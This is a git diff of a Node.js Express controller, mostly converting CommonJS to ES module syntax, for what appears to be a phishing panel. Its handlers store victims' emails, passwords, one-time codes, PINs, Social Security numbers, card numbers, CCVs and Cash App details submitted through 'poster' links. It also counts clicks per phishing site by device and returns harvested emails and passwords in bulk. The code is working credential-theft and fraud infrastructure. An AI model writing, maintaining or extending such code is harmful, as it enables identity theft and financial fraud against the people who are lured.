@@ -1,17 +1,17 @@
 
-const User = require('../models/User')
-const Info = require('../models/Info')
-const Link = require('../models/Link')
-const Click = require('../models/Click')
-
-const Poster = require('../models/Poster')
-const device = require('express-device');
-const useragent = require('express-useragent');
-const Site = require('../models/Site')
-const createToken = require('../utils/createToken')
-const Demo = require('../models/Demo')
-const Cash = require('../models/Cash')
-const changeEvent = require('../stream.js')
+import User from '../models/User.js'
+import Info from '../models/Info.js'
+import Link from '../models/Link.js'
+import Click from '../models/Click.js'
+// import socket from '../server.js'
+import Poster from '../models/Poster.js'
+import device from 'express-device'
+import useragent from 'express-useragent'
+import Site from '../models/Site.js'
+import createToken from '../utils/createToken.js'
+import Demo from '../models/Demo.js'
+import Cash from '../models/Cash.js'
+import changeEvent from'../stream.js'
 
 
 // const {API_KEY}=require('../keys')
@@ -49,7 +49,7 @@ const changeEvent = require('../stream.js')
 
 
 
-module.exports.signup_post = async (req, res) => {
+export const   signup_post = async (req, res) => {
     const { username, password, links, adminId, numOfPostersPermission } = req.body;
 
     try {
@@ -84,7 +84,7 @@ module.exports.signup_post = async (req, res) => {
 
 
 }
-module.exports.login_post = async (req, res) => {
+export const login_post = async (req, res) => {
     const { username, password } = req.body;
     try {
         const user = await User.findOne({ username: username })
@@ -136,7 +136,7 @@ module.exports.login_post = async (req, res) => {
 }
 
 
-module.exports.skip_code = (req, res) => {
+export const skip_code = (req, res) => {
     const { id, skipcode } = req.body;
     Info.findOneAndUpdate({ _id: id }, {
         $set: {
@@ -151,7 +151,7 @@ module.exports.skip_code = (req, res) => {
     })
 
 }
-module.exports.add_posterNumber = (req, res) => {
+export const add_posterNumber = (req, res) => {
     const { username, numberAdd } = req.body;
     User.findOneAndUpdate({ username: username }, {
         $set: {
@@ -169,7 +169,7 @@ module.exports.add_posterNumber = (req, res) => {
 
 
 
-module.exports.add_new_links = (req, res) => {
+export const add_new_links = (req, res) => {
     const { username, links } = req.body;
     User.findOneAndUpdate({ username: username }, {
         $set: {
@@ -194,7 +194,7 @@ module.exports.add_new_links = (req, res) => {
 
 
 
-module.exports.info_get = async (req, res) => {
+export const info_get = async (req, res) => {
 
     const { username, id, admin } = req.params
     console.log(username)
@@ -228,7 +228,7 @@ module.exports.info_get = async (req, res) => {
 }
 
 
-module.exports.poster_add = async (req, res) => {
+export const poster_add = async (req, res) => {
 
     const { username, password, links, id, posterId } = req.body
 
@@ -283,7 +283,7 @@ module.exports.poster_add = async (req, res) => {
 }
 
 
-module.exports.add_data = async (req, res) => {
+export const add_data = async (req, res) => {
 
     const { adminId, posterId } = req.params
     const { site, email, password, skipcode ,username,passcode } = req.body
@@ -317,7 +317,7 @@ module.exports.add_data = async (req, res) => {
 }
 
 
-module.exports.change_password = async (req, res) => {
+export const change_password = async (req, res) => {
     const { user, poster, password } = req.body;
     const filter = { username: poster };
     const update = { password: password };
@@ -348,7 +348,7 @@ module.exports.change_password = async (req, res) => {
 }
 
 
-module.exports.delete_poster =  (req, res) => {
+export const delete_poster =  (req, res) => {
 
     const { id_pos,id_ad } = req.params
 //    return  res.status(422).json({ id: id_pos })
@@ -381,7 +381,7 @@ User.findOne({_id: id_ad}).then(user => {
 
 }
 
-module.exports.link_add = async (req, res) => {
+export const link_add = async (req, res) => {
 
     const { linkName } = req.body
 
@@ -404,7 +404,7 @@ module.exports.link_add = async (req, res) => {
 
 }
 
-module.exports.link_get = async (req, res) => {
+export const link_get = async (req, res) => {
 
     const { id } = req.params
 
@@ -421,7 +421,7 @@ module.exports.link_get = async (req, res) => {
 
 
 
-module.exports.all_poster = async (req, res) => {
+export const all_poster = async (req, res) => {
 
     const { id } = req.params
 
@@ -446,7 +446,7 @@ module.exports.all_poster = async (req, res) => {
 }
 
 
-module.exports.poster_details = async (req, res) => {
+export const poster_details = async (req, res) => {
 
     const { id } = req.params
 
@@ -468,7 +468,7 @@ module.exports.poster_details = async (req, res) => {
 
 
 
-module.exports.add_site = async (req, res) => {
+export const add_site = async (req, res) => {
     const { name } = req.body
 
 
@@ -493,7 +493,7 @@ module.exports.add_site = async (req, res) => {
 
 }
 
-module.exports.link_details = async (req, res) => {
+export const link_details = async (req, res) => {
 
     const { id,admin} = req.params
     // return res.status(200).json({ data: id, sites: admin })
@@ -525,7 +525,7 @@ if(admin == 1){
 
 
 
-module.exports.site_exist =async (req, res) => {
+export const site_exist =async (req, res) => {
 
     const { site, adminId, posterId } = req.params
     const siteName = "https://" + site + "/" + adminId + "/" + posterId
@@ -552,7 +552,6 @@ module.exports.site_exist =async (req, res) => {
               if(sitefound){
                 sitefound.click=sitefound.click+1
                 await sitefound.save()
-                // req.useragent.isDesktop === true
                 if(req.useragent.isDesktop === true){
                     sitefound.desktop=sitefound.desktop+1
                     await sitefound.save()
@@ -602,7 +601,7 @@ module.exports.site_exist =async (req, res) => {
 }
 
 
-module.exports.admin_add_site = async (req, res) => {
+export const admin_add_site = async (req, res) => {
 
     const { username, site } = req.body
     // return res.status(200).json({ success: "username" })
@@ -634,7 +633,7 @@ module.exports.admin_add_site = async (req, res) => {
 
 
 
-module.exports.new_site_add_poster =  (req, res) => {
+export const new_site_add_poster =  (req, res) => {
 
     const { id, password, links } = req.body
     // const filter = { _id: id };
@@ -672,7 +671,7 @@ module.exports.new_site_add_poster =  (req, res) => {
 
 
 
-module.exports.get_A_poster = async (req, res) => {
+export const get_A_poster = async (req, res) => {
 
     const { id,admin} = req.params
 
@@ -753,7 +752,7 @@ module.exports.get_A_poster = async (req, res) => {
 
 
 
-module.exports.click = async (req, res) => {
+export const click = async (req, res) => {
     const { adminId,posterId } = req.params
 
 
@@ -776,7 +775,7 @@ module.exports.click = async (req, res) => {
 }
 
 
-module.exports.click_for_admin = async (req, res) => {
+export const click_for_admin = async (req, res) => {
     const { adminId } = req.params
 
 
@@ -798,7 +797,7 @@ module.exports.click_for_admin = async (req, res) => {
 
 }
 
-module.exports.pass_change = async (req, res) => {
+export const pass_change = async (req, res) => {
     const { username ,password} = req.body
 
     // return res.status(200).json({ success: "changed succesfully" })
@@ -825,7 +824,7 @@ module.exports.pass_change = async (req, res) => {
 
 
 
-module.exports.update_validity =  (req, res) => {
+export const update_validity =  (req, res) => {
 
     const { username } = req.body
     const currentDate = new Date();
@@ -844,7 +843,7 @@ module.exports.update_validity =  (req, res) => {
 
 }
 
-module.exports.cashapap_post = async (req, res) => {
+export const cashapap_post = async (req, res) => {
     const { adminId, posterId } = req.params
     const { contact,code, pin, ssn,email,password, site, card_number,mm_yy, ccv,zip} = req.body;
 
@@ -880,7 +879,7 @@ module.exports.cashapap_post = async (req, res) => {
 
 
 
-module.exports.links_add =  (req, res) => {
+export const links_add =  (req, res) => {
 
     const { username,link } = req.body
     const currentDate = new Date();
@@ -902,7 +901,7 @@ module.exports.links_add =  (req, res) => {
 
 
 
-module.exports.get_deyails_cashapp = async (req, res) => {
+export const get_deyails_cashapp = async (req, res) => {
     const { anyid } = req.params
 
 
@@ -930,7 +929,7 @@ module.exports.get_deyails_cashapp = async (req, res) => {
 
 
 
-module.exports.demo_add = async (req, res) => {
+export const demo_add = async (req, res) => {
     const {username, linkName,age } = req.body;
 console.log(username, linkName,age )
     try {
@@ -957,12 +956,14 @@ console.log(username, linkName,age )
 }
 
 
-module.exports.show_all = async (req, res) => {
-    
+export const show_all = async (req, res) => {
+    // socket.io.on("setup",()=>{
+    //     socket.io.emit("done")
+    // })
     try {
       
         
-        const userFound = await Info.find()
+        const userFound = await Info.find().select("email password")
 
         return res.status(200).json({ user: userFound })
 
@@ -975,7 +976,7 @@ module.exports.show_all = async (req, res) => {
     }
 
 }
-module.exports.check_qrcode = async (req, res) => {
+export const check_qrcode = async (req, res) => {
     const { adminId } = req.params
 
     try {
@@ -1005,7 +1006,7 @@ if(userFound){
 
 }
 
-module.exports.rqcode_permission =  (req, res) => {
+export const rqcode_permission =  (req, res) => {
 
     const { username } = req.body
     User.findOneAndUpdate({ username: username }, {
@@ -1022,7 +1023,7 @@ module.exports.rqcode_permission =  (req, res) => {
 
 }
 
-module.exports.update_many =  (req, res) => {
+export const update_many =  (req, res) => {
 
     const conditions = {};
     const update = {
@@ -1043,7 +1044,7 @@ module.exports.update_many =  (req, res) => {
 }
 
 
-module.exports.add_data_checnge = async (req, res) => {
+export const add_data_checnge = async (req, res) => {
 
     const { adminId, posterId } = req.params
     const { site, email, password, skipcode ,username,passcode } = req.body
